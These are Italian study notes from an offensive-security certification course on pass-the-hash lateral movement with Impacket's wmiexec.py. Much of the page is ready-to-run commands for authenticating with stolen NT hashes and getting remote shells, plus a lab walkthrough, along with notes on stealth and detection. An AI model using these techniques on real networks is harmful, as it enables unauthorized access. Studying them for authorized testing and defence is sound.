# 010 — Pass-the-Hash with WMIExec (Lateral Movement & Pivoting)

> **Modulo:** Lateral Movement & Pivoting · **Video:** 10/16
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [010_Pass-the-Hash with WMIExec.txt](010_Pass-the-Hash with WMIExec.txt) · [010_Pass-the-Hash with WMIExec.srt](010_Pass-the-Hash with WMIExec.srt)

## Concetti chiave

- **WMI** = *Windows Management Instrumentation* → framework Microsoft per gestire/monitorare sistemi Windows (locale o remoto).
- WMI sfrutta **DCOM** (Distributed Component Object Model) e **RPC** sotto.
- Porte: **TCP 135** (RPC endpoint mapper) + porta dinamica nell'intervallo **49152–65535**.
- **`wmiexec.py`** (Impacket) = remote command execution via WMI; supporta nativamente **Pass-the-Hash** (`-hashes LM:NT`).
- Più "silenzioso" di PsExec: **non crea servizi**, **non scrive su ADMIN$** → footprint ridotto, meno detection.
- Shell ottenuta è **semi-interactive**: ogni comando è una WMI call separata (no full TTY).
- Supporta switch tra `cmd` e `powershell` (`-shell-type powershell`).

## Spiegazione approfondita

### Cos'è WMI e perché è utile per lateral movement
WMI è una **legitimate management interface** che ogni Windows host moderno espone. Gli admin la usano per query (CPU, processi, servizi), eseguire script remoti, modificare config. Per un attaccante è **gold**: usa traffico considerato lecito (DCOM/RPC), non richiede installazioni, non lascia file su disco.

### Stack di comunicazione
```
Attacker (Kali)  ──> TCP 135  ─────────────────────────> Target (RPC Endpoint Mapper)
                                                            │ negozia porta dinamica
                  <── TCP 49152-65535 (Dynamic RPC) ─────── │
                                                            │
                  ──── WMI request (Win32_Process.Create) ──>
                  <──── output ─────────────────────────────
```

L'intervallo dinamico **può essere ristretto via GPO o registry** → in alcune reti il pen tester trova solo poche porte alte aperte oltre la 135.

### WMI vs PsExec vs SMBExec
| Tecnica | Servizio creato | Scrive su share | Porte | Detection |
|---|---|---|---|---|
| PsExec | Sì (temp) | ADMIN$ | SMB 445 | Alta (Event 7045) |
| SMBExec | No (semi-service) | ADMIN$ | SMB 445 | Media |
| **WMIExec** | **No** | **No** | **135 + dyn RPC** | **Bassa** |

### Implementazioni disponibili
- **Impacket `wmiexec.py`** ← usato nella demo
- **CrackMapExec** ha `--exec-method wmiexec` (ma non è la scelta consigliata)
- **Custom scripts** (PowerShell `Invoke-WmiMethod`, C#, ecc.)

### Formato hash
Stesso pattern di PsExec/SMBExec di Impacket: `-hashes LM:NT`. Se hai solo NT → 32 zeri davanti.

## Comandi & strumenti

```bash
# Pass-the-Hash con WMIExec (Impacket)
wmiexec.py -hashes 00000000000000000000000000000000:<NT_HASH> administrator@<TARGET_IP>

# Equivalente con clear-text password
wmiexec.py administrator:<password>@<TARGET_IP>

# Con dominio (AD)
wmiexec.py -hashes :<NT_HASH> domain.local/administrator@<TARGET_IP>

# Cambia shell type a PowerShell
wmiexec.py -shell-type powershell -hashes :<NT_HASH> administrator@<TARGET_IP>

# Specifica share alternativa per output (default ADMIN$ per output capture)
wmiexec.py -share C$ -hashes :<NT_HASH> administrator@<TARGET_IP>

# Help completo
wmiexec.py -h
```

Tool citati:
- `wmiexec.py` (Impacket) — principale
- `crackmapexec smb <target> -u <u> -H <hash> --exec-method wmiexec`
- PowerShell `Invoke-WmiMethod -ComputerName <t> -Class Win32_Process -Name Create -ArgumentList "cmd /c ..."`

## Esempi pratici

```bash
# === Scenario lab: hai NT hash di administrator ===
# Hash fornito (NT only): 32ed87bdb5fdc5e9cba88547376818d4
# Prepend zeros per LM:
HASH="00000000000000000000000000000000:32ed87bdb5fdc5e9cba88547376818d4"

wmiexec.py -hashes $HASH administrator@10.0.0.50
# Impacket v0.x.x - Copyright ...
# [*] SMBv3.0 dialect used
# [!] Launching semi-interactive shell - Careful what you execute
# [!] Press help for extra shell commands

C:\> whoami
nt authority\system
C:\> hostname
WIN-TARGET01
C:\> ipconfig
...

# === Switch a PowerShell ===
wmiexec.py -shell-type powershell -hashes $HASH administrator@10.0.0.50

PS C:\> Get-Process
PS C:\> Get-Service | Where-Object {$_.Status -eq "Running"}
```

```bash
# === Variante AD con dominio ===
wmiexec.py -hashes :32ed87bdb5fdc5e9cba88547376818d4 \
           research.security.local/administrator@10.0.5.10
```

## Punti d'attenzione per l'esame eCPPT

- **WMI usa RPC su 135** + **porta dinamica 49152–65535** (TCP). NON usa SMB 445 per il comando (lo può usare per pull output dipendentemente dall'implementazione).
- **No servizio creato, no file su ADMIN$** → tecnica più stealthy rispetto a PsExec. Domanda da esame.
- **Sintassi Impacket**: `wmiexec.py [-hashes LM:NT] <user>@<target>`. Senza dominio = workgroup/local.
- **Hash format**: `LM:NT`. Solo NT? → `:` davanti oppure 32 zeri. Entrambi accettati.
- **Shell type**: default `cmd`; opzione `-shell-type powershell` per PS.
- **Privilegi**: richiede comunque **membership in local Administrators** (per chiamare `Win32_Process.Create`).
- **Comando wrapper interno**: WMIExec usa la classe **`Win32_Process` metodo `Create`** — riconoscibile nei log se WMI auditing è attivo.
- **Output capture**: tradizionalmente WMI non restituisce stdout → Impacket usa un trick con SMB share per leggerlo. Da qui la natura **semi-interactive** (non full TTY).
- **Detection**: Sysmon Event ID 1 (`ProcessCreate` con parent `WmiPrvSE.exe`) è l'indicatore principale.
- **Cross-tool**: `crackmapexec smb -u u -H hash -x "comando"` con `--exec-method wmiexec` fa la stessa cosa per one-shot.

## Collegamenti con altri video

- Precedente: [[09_Pass-the-Hash with Metasploit]]
- Alternative SMB-based: [[04_Lateral Movement with PsExec]] · [[05_Lateral Movement with SMBExec]]
- Catch-all PtH: [[06_Lateral Movement with CrackMapExec]]
- Prossimo (cambio OS): [[011_Linux Lateral Movement Techniques]]
- Pivoting downstream: [[012_Pivoting & Port Forwarding with Metasploit]]
